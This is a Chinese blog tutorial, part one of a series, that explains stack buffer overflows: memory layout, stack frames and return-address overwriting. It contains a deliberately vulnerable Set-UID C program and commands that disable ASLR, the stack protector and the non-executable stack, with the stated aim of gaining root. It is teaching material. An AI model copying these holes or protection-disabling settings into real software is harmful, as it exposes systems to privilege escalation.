<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>Buffer Overflow Attack ，part1：基本原理 | FireKnight-HJ</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Buffer Overflow Attack ，part1：基本原理">
<meta property="og:type" content="article">
<meta property="og:title" content="Buffer Overflow Attack ，part1：基本原理">
<meta property="og:url" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/index.html">
<meta property="og:site_name" content="FireKnight-HJ">
<meta property="og:description" content="Buffer Overflow Attack ，part1：基本原理">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649001478958.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649002904880.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649045256141.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649047692648.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649054410622.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649059359839.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649054410622.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649229770023.png">
<meta property="og:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649232456404.png">
<meta property="article:published_time" content="2022-04-06T08:19:18.000Z">
<meta property="article:modified_time" content="2022-04-06T08:21:06.883Z">
<meta property="article:author" content="fireknight">
<meta property="article:tag" content="Buffer Overflow Attack">
<meta property="article:tag" content="C语言">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649001478958.png">
    

    <!-- Favicon -->
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="FireKnight-HJ" type="application/atom+xml">
</head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                otaku keeps alive
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        <article id="post-Buffer-Overflow-Attack-，part1：基本原理"
         class="post article white-box article-type-post"
         itemscope itemprop="blogPost">
    <h2 class="title">
        <a href="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">
            Buffer Overflow Attack ，part1：基本原理
        </a>
    </h2>
    <time>
        4月 6, 2022
    </time>
    <section class="content">
        <div class="article-entry" itemprop="articleBody">
            <p>Buffer Overflow Attack ，part1：基本原理</p>
<span id="more"></span>
<h2 id="Buffer-Overflow-Attack-buffer溢出攻击"><a href="#Buffer-Overflow-Attack-buffer溢出攻击" class="headerlink" title="Buffer Overflow Attack buffer溢出攻击"></a>Buffer Overflow Attack buffer溢出攻击</h2><p>从1988年的莫里斯蠕虫，2001年的红色代码蠕虫，2003年的SQLSlammer到2015年对安卓手机的快速攻击，buffer溢出攻击在计算机安全的历史上发挥了重要作用。这是一种经典的攻击，它对许多计算机系统和应用程序仍然有效。</p>
<h3 id="1-程序的内存memory布局"><a href="#1-程序的内存memory布局" class="headerlink" title="1. 程序的内存memory布局"></a>1. 程序的内存memory布局</h3><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649001478958.png" alt="uTools_1649001478958"></p>
<p>memory分成5个段，每个段有各自的功能：</p>
<ol>
<li>文本段Text segment：存储该程序的可执行代码。这个内存块通常是只读的。</li>
<li><p>数据段Data segment：存储由程序员初始化的静态/全局变量。例如，在static int a=3中定义的变量a将存储在数据段中。</p>
</li>
<li><p>BSS段：存储未初始化的静态/全局变量。这个段将被操作系统填充为零，因此所有未初始化的变量都用零初始化。例如，在static int b中定义的变量b将存储在BSS段中，并被初始化为零。</p>
</li>
<li><p>堆Heap：提供动态memory分配的空间，由malloc，calloc，realloc，free管理</p>
</li>
<li>栈Stack：该堆栈用于存储在函数中定义的局部变量，以及存储与函数调用相关的数据，如返回地址、参数等。</li>
</ol>
<h3 id="2-堆栈和功能调用"><a href="#2-堆栈和功能调用" class="headerlink" title="2. 堆栈和功能调用"></a>2. 堆栈和功能调用</h3><p>在stack和heap上都可能发生buffer溢出。而利用它们的方法则截然不同。我们将重点介绍基于堆栈的buffer溢出。为了理解它是如何工作的，我们需要深入了解Stack是如何工作的，以及Stack上存储了什么信息。</p>
<h4 id="2-1-栈内存布局"><a href="#2-1-栈内存布局" class="headerlink" title="2.1 栈内存布局"></a>2.1 栈内存布局</h4><p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649002904880.png" alt="uTools_1649002904880"></p>
<p>当调用func()时，将在堆栈的顶部分配一个内存空间块，并被称为堆栈帧。堆栈框架的布局如图4.2所示。一个堆栈框架具有四个重要区域：</p>
<ul>
<li><p>参数：此区域存储了传递给该函数的参数的值。在我们的例子中，func()有两个整数参数。当调用这个函数时，例如，func（5,8），参数的值将被推入堆栈中，形成堆栈帧的开始。需要注意的是，参数是按相反的顺序推送的；原因将在我们引入帧指针的后面讨论。</p>
</li>
<li><p>返回地址：当函数完成并命中其返回指令时，它需要知道返回到哪里，即，返回地址需要存储在某个地方。在跳到函数的入口之前，计算机将下一条指令的地址——直接放置在函数调用指令之后的指令——推到堆栈的顶部，这是堆栈帧中的“返回地址”区域。</p>
</li>
<li>上一帧指针：程序推到堆栈帧中的下一项是前一帧的帧指针。我们将在4.2.2中更详细地讨论框架指针。</li>
<li>局部变量：下一个区域是用于存储函数的局部变量。该区域的实际布局，如局部变量的顺序、区域的实际大小等，都取决于编译器。一些编译器可能会随机化局部变量的顺序，或者为这个区域给出额外的空间[Bryant和奥哈拉伦，2015]。程序员不应该为这个区域承担任何特定的顺序或大小</li>
</ul>
<h4 id="2-2-帧指针Frame-Pointer"><a href="#2-2-帧指针Frame-Pointer" class="headerlink" title="2.2 帧指针Frame Pointer"></a>2.2 帧指针Frame Pointer</h4><p>在func()中，我们需要访问参数和局部变量。唯一的方法就是知道他们的内存地址。不幸的是，在编译期间无法确定地址，因为编译器无法预测堆栈的运行时状态，也无法知道堆栈帧将在哪里。为了解决这个问题，在CPU中引入了一种特殊的寄存器。它被称为帧指针Frame  Pointer。这个寄存器指向堆栈帧中的一个固定位置，因此可以使用这个寄存器和一个偏移量来计算每个寄存器和局部变量的地址。偏移量可以在编译期间确定，而帧指针的值可以在运行期间发生变化，这取决于堆栈帧在堆栈上分配的位置。</p>
<p>在x86体系结构中，帧指针寄存器(ebp)总是指向存储前一个帧指针的区域。对于32位体系结构，返回地址和帧指针都占用4字节的内存，因此变量a和b的实际地址分别为ebp+8和ebp+12。</p>
<p>下面是对应的C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x, y;</span><br><span class="line">	x = a + b;</span><br><span class="line">	y = a - b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是执行x=a+b的汇编：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl 12(%ebp), %eax ; b is stored in %ebp + 12</span><br><span class="line">movl 8(%ebp), %edx ; a is stored in %ebp + 8</span><br><span class="line">addl %edx, %eax</span><br><span class="line">movl %eax, -8(%ebp) ; x is stored in %ebp - 8</span><br></pre></td></tr></table></figure>
<ul>
<li>值得注意的是，变量x实际上是由编译器在帧指针下方分配的8个字节，而不是如图所示的4个字节。正如我们已经提到的，<strong>局部变量区域的实际布局由编译器决定</strong>。在汇编代码中，我们可以从-8(%ebp)中看到，变量x存储在%ebp-8的位置上。因此，使用在运行时决定的帧指针和在编译时决定的偏移量，我们可以找到所有变量的地址。</li>
</ul>
<p><strong>Previous frame pointer 和函数调用链：</strong></p>
<p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649045256141.png" alt="uTools_1649045256141"></p>
<p>(看图，Current Frame Pointer指向的就是Previous Frame Pointer对应位置，而Previous Frame Pointer)就是父函数的Frame Pointer值，保证了子函数返回运行结束返回父函数的时候可以找到父函数的Current Frame Pointer。</p>
<h3 id="3-Stack-Buffer-Overflow-Attack"><a href="#3-Stack-Buffer-Overflow-Attack" class="headerlink" title="3. Stack Buffer-Overflow Attack"></a>3. Stack Buffer-Overflow Attack</h3><p>内存复制在程序中非常常见，其中需要将来自一个地方(源）的数据复制到另一个地方(目的地）。在复制之前，程序需要为目标分配内存空间。有时，程序员可能会犯错误，无法为目标分配足够的内存量，因此，复制到目标buffer的数据将比分配的空间量更多。这将导致溢出。</p>
<p>有些语言，比如Java，可以在buffer溢出时自动检测到问题，但许多其他语言，如C和C++无法检测到它。大多数人可能认为buffer溢出可能造成的唯一破坏是程序崩溃，因为buffer之外的数据崩溃；然而，令人惊讶的是，这样一个简单的错误可能会使攻击者获得对程序的完全控制，而不是简单地使它崩溃。如果一个易受攻击的程序以特权运行，攻击者将能够获得这些特权。在本节中，我们将解释这种攻击是如何工作的。</p>
<h4 id="3-1-数据复制到Buffer"><a href="#3-1-数据复制到Buffer" class="headerlink" title="3.1 数据复制到Buffer"></a>3.1 数据复制到Buffer</h4><p>C中复制数据的函数有：strcpy(), strcat(), memcpy()等，我们演示用strcpy()的问题进行攻击。</p>
<p>strcpy()函数当且仅当在读到’\0’才会停止复制。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> src[<span class="number">40</span>]=<span class="string">&quot;Hello world \0 Extra string&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> dest[<span class="number">40</span>];</span><br><span class="line">	<span class="comment">// copy to dest (destination) from src (source)</span></span><br><span class="line">	<span class="built_in">strcpy</span> (dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行上述代码，这个函数strcpy()在”\0”就停下了，因此extra string部分不会出现在dest中</p>
<h4 id="3-2-Buffer-Overflow"><a href="#3-2-Buffer-Overflow" class="headerlink" title="3.2 Buffer Overflow"></a>3.2 Buffer Overflow</h4><p>当我们将字符串复制到目标buffer时，如果字符串超过buffer的大小，会发生什么？让我们来看看下面的例子。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">12</span>];</span><br><span class="line">	<span class="comment">/* The following statement will result in a buffer overflow */</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *str = <span class="string">&quot;This is definitely longer than 12&quot;</span>;</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>stack分布如下：</p>
<p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649047692648.png" alt="uTools_1649047692648"></p>
<p>可以看到，虽然Stack的延申方向是从高地址到低地址，但是数组buffer[]的延申方向还是从低到高地址。buffer还是沿正常的方向增长（从低到高），当我们复制数据到buffer[]时，我们从buffer[0]开始，并最终复制到buffer[11]。如果还有更多的数据要复制，strcpy()将继续将数据复制到buffer上方的区域，将buffer之外的内存视为buffer[12]、buffer[13]等等。</p>
<p>如图4.4所示，buffer上方的区域有重要信息，包括return address和previous frame pointer。return address会影响函数返回时程序应该跳转到的（在text segment上的对应）位置。如果返回地址字段由于缓冲区溢出而被修改，那么当函数返回时，它将返回到一个新的位置。</p>
<p>这样的话就有几件事可能会发生。</p>
<ul>
<li>首先，新地址是一个虚拟地址，可能不会映射到任何物理地址，因此返回指令将失败，程序将崩溃。</li>
<li>其次，地址可以映射到物理地址，但地址空间受到保护，比如操作系统内核使用的地址；跳转会失败，程序会崩溃。</li>
<li>第三，该地址可以被映射到一个物理地址，但该地址中的数据不是一个有效的机器指令（例如，它可能是一个数据区域）；返回程序将再次失败，程序也将再次失败</li>
<li><strong>第四，地址中的数据可能碰巧是一个有效的机器指令，所以程序将继续运行，但程序的逻辑将与原来的逻辑不同。</strong></li>
</ul>
<h4 id="3-3-利用-Buffer-Overflow-漏洞"><a href="#3-3-利用-Buffer-Overflow-漏洞" class="headerlink" title="3.3 利用 Buffer Overflow 漏洞"></a>3.3 利用 Buffer Overflow 漏洞</h4><p>正如我们从上面的结果中所看到的，通过溢出一个缓冲区，我们可以导致一个程序崩溃或运行一些其他代码。从攻击者的角度来看，后者听起来更有趣，特别是如果我们（作为攻击者）能够控制要运行的代码，因为这将允许我们劫持程序的执行。如果一个程序是有特权的，那么能够劫持该程序就会导致攻击者的特权升级。</p>
<p>让我们看看如何让一个易受攻击的程序来运行我们的代码。在前面的程序示例中，该程序不从外部获取任何输入，因此即使存在缓冲区溢出问题，攻击者也不能利用它。在实际的应用程序中，程序通常从用户那里获得输入。请参阅以下程序示例(stack.c)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This program has a buffer overflow vulnerability. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">	<span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">400</span>];</span><br><span class="line">	FILE *badfile;</span><br><span class="line">	badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">300</span>, badfile);</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述程序从一个名为“badfile”的文件中读取300字节的数据，然后将该数据复制到一个大小为100的缓冲区中。显然，存在一个缓冲区溢出问题。这一次，复制到缓冲区的内容来自于用户提供的文件，即，用户可以控制复制到缓冲区的内容。</p>
<p>问题是要在“badfile”中存储什么，从而在溢出缓冲区之后，我们可以让程序来运行我们的代码。</p>
<p>我们需要首先将我们的代码（即恶意代码）放入正在运行的程序的内存中。这并不难。我们可以简单地将代码放在“badfile”中，因此当程序读取文件时，代码被加载到str[]数组中；当程序将str复制到目标缓冲区时，代码将存储在Stack中。在图4.5中，我们将恶意代码放在“坏文件”的末尾。</p>
<p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649054410622.png" alt="uTools_1649054410622"></p>
<p>接下来，我们需要强制程序跳转到我们的代码中，它已经在内存中了。为此，使用代码中的缓冲区溢出问题，我们可以覆盖返回地址字段。如果我们知道恶意代码的地址，我们就可以简单地使用这个地址来覆盖返回地址字段。因此，当函数foo返回时，它将跳转到新地址，即存储代码的位置。图4.5说明了如何让程序跳转到我们的代码中。</p>
<p>在理论上，这就是缓冲区溢出攻击的工作方式。实际上，它要复杂得多。在接下来的几节中，我们将描述如何对清单4.1中描述的脆弱的Set-UID程序实际启动缓冲区溢出攻击。我们将描述攻击中的挑战以及如何克服它们。我们的目标是通过利用特权程序中的缓冲区溢出漏洞来获得根特权。</p>
<h3 id="4-实验前设置"><a href="#4-实验前设置" class="headerlink" title="4. 实验前设置"></a>4. 实验前设置</h3><p>我们将在我们的Ubuntu16.04虚拟机内进行攻击实验。由于缓冲区溢出问题有很长的历史，大多数操作系统已经开发出了针对这种攻击的对策。为了简化我们的实验，我们首先需要关闭这些对策。稍后，我们将重新启用它们，并表明其中一些对策只会使攻击变得更加困难，而不是将buffer overflow攻击变成不可能。我们将展示他们如何才能被攻破。</p>
<h4 id="4-1Disable-Address-Randomization"><a href="#4-1Disable-Address-Randomization" class="headerlink" title="4.1Disable Address Randomization"></a>4.1Disable Address Randomization</h4><p>针对缓冲区溢出攻击的对策之一是地址空间布局随机化攻击(ASLR)[维基百科，2017b]。它将进程中关键数据区域的内存空间随机化，包括the base of the executable和堆heap、栈stack和库library的位置，这使得攻击者很难猜测注入的恶意代码的地址。我们将在4.9中讨论这一对策，并展示如何击败它。对于这个实验，我们将简单地使用以下commad来关闭它：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure>
<h4 id="4-2-Vulnerable-Program"><a href="#4-2-Vulnerable-Program" class="headerlink" title="4.2 Vulnerable Program"></a>4.2 Vulnerable Program</h4><p>我们的目标是利用Set-UID根程序中的缓冲区溢出漏洞。Set-UID根程序在正常用户执行时使用根权限运行，在正常程序时给予正常用户额外的特权。如果在具有特权的Set-UID根程序中可以利用缓冲区溢出漏洞，那么如果注入的恶意代码被执行，则可以使用根程序的权限运行。我们将使用上面所示的脆弱程序(stack.c)作为我们的目标程序。这个程序可以使用以下命令被编译并转换为一个root-owned的Set-UID程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -o stack -z execstack -fno-stack-protector stack.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chown root stack</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod 4755 stack</span></span><br></pre></td></tr></table></figure>
<p>第一个命令编译stack.c，第二个和第三个命令将executable stack转换为root-owned的Set-UID程序。</p>
<p>需要注意，第2，3条command是不能反过来的，因为当chown命令更改文件的所有权时，它会出于安全考虑清空Set-UID位。在第一个命令gcc中，我们使用了两个gcc选项来关闭已经内置到gcc编译器中的两个对付buffer overflow对策。</p>
<ul>
<li>-z execstack：默认情况下，stack是”不可执行”的，这可以防止注入的恶意代码被执行。这种对策被称为non-executable stack[维基百科，2017o]。一个程序，通过在二进制文件中的一个特殊标记，可以告诉操作系统其stack是否应该设置为可执行的。二进制文件中的标记通常由编译器来完成。gcc编译器默认将stack标记为non-executable，“-z execstack”选项将此相反，使堆栈可执行。(实际上，这个对策可以用return-to-libc攻击化解)</li>
<li>-fno-stack-protector：这个选项关闭了另一种被称为栈保护器的对策[Cowa等人，1998]，它可以击败基于栈的缓冲区溢出攻击。它的主要思想是向代码中添加一些特殊的数据和检查机制，这样当发生缓冲区溢出时，它就会被检测到。</li>
</ul>
<p>为了理解这个程序的行为，我们将一些随机的内容放在坏文件中。我们可以注意到，当文件的大小小于100字节时，程序将运行没有问题。但是，当我们在文件中放置超过100个字节时，程序可能会崩溃。这是我们在发生缓冲区溢出时所期望的结果。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;aaaa&quot;</span> &gt; badfile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./stack</span></span><br><span class="line">Returned Properly</span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br><span class="line"><span class="bash">$ <span class="built_in">echo</span> <span class="string">&quot;aaa ...(100 characters omitted)... aaa&quot;</span> &gt; badfile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./stack</span></span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
<h3 id="5-执行-Buffer-Overflow-攻击"><a href="#5-执行-Buffer-Overflow-攻击" class="headerlink" title="5.执行 Buffer-Overflow 攻击"></a>5.执行 Buffer-Overflow 攻击</h3><p>我们的目标是利用易受攻击的程序stack.c中的缓冲区溢出漏洞，它使用root权限运行。我们需要构建badfiile，这样当程序将文件内容复制到一个缓冲区时，缓冲区被覆盖，我们注入的恶意代码可以被执行，允许我们获得一个root shell。本节将首先讨论攻击中的挑战，然后详细介绍我们如何克服这些挑战。</p>
<h4 id="5-1-Finding-the-Address-of-the-Injected-Code"><a href="#5-1-Finding-the-Address-of-the-Injected-Code" class="headerlink" title="5.1 Finding the Address of the Injected Code"></a>5.1 Finding the Address of the Injected Code</h4><p>为了能够跳转到我们的恶意代码，我们需要知道恶意代码的内存地址。不幸的是，<strong>我们不知道我们的恶意代码到底在哪里</strong>。我们只知道我们的代码被复制到栈上的目标缓冲区中，但我们<strong>不知道缓冲区的内存地址，因为它的确切位置取决于程序的栈使用情况</strong>。</p>
<p>我们知道输入中恶意代码的偏移量，但我们需要知道函数foo的stack frame地址，以准确地计算我们的代码将被存储的位置。不幸的是，目标程序不太可能打印出其”帧指针”的值或帧内任何变量的地址，这让我们别无选择，只能猜测。理论上，一个随机猜测的整个搜索空间是$2^{32}$个地址（对于32位的机器），但在实际应用中，这个空间要小得多。</p>
<p>有两个事实使得搜索空间很小。</p>
<ul>
<li>首先，在引入对策之前，大多数操作系统将堆栈（每个进程都有一个）放置在一个固定的起始地址上。需要注意的是，该地址是一个虚拟地址，它被映射到不同进程的不同物理内存地址。因此，对于不同的进程为其堆栈使用相同的虚拟地址，也不会存在冲突。</li>
<li>其次，大多数程序都没有很深的堆栈。从图4.3中，我们可以看到，如果函数调用链很长，堆栈可以变得更深，但这种情况通常发生在递归函数调用中。通常，调用链不是很长，所以在大多数程序中，堆栈都很浅。结合第一个和第二个事实，我们可以看出搜索空间比232要小得多，所以猜测正确的地址应该很容易</li>
</ul>
<p>为了验证Stack总是从一个固定的起始地址开始，我们使用以下程序来打印出一个函数中的一个本地变量的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span>* a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; :: a1’s address is 0x%x \n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>) &amp;a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">3</span>;</span><br><span class="line">	func(&amp;x);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们在<strong>关闭地址随机化的情况下运行上述程序</strong>。从下面的执行跟踪中，我们可以看到<strong>变量的地址总是相同的，这表明Stack的起始地址总是相同的</strong>。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo sysctl -w kernel.randomize_va_space=0</span></span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line"><span class="meta">$</span><span class="bash"> gcc prog.c -o prog</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./prog</span></span><br><span class="line">:: a1’s address is 0xbffff370</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./prog</span></span><br><span class="line">:: a1’s address is 0xbffff370</span><br></pre></td></tr></table></figure>
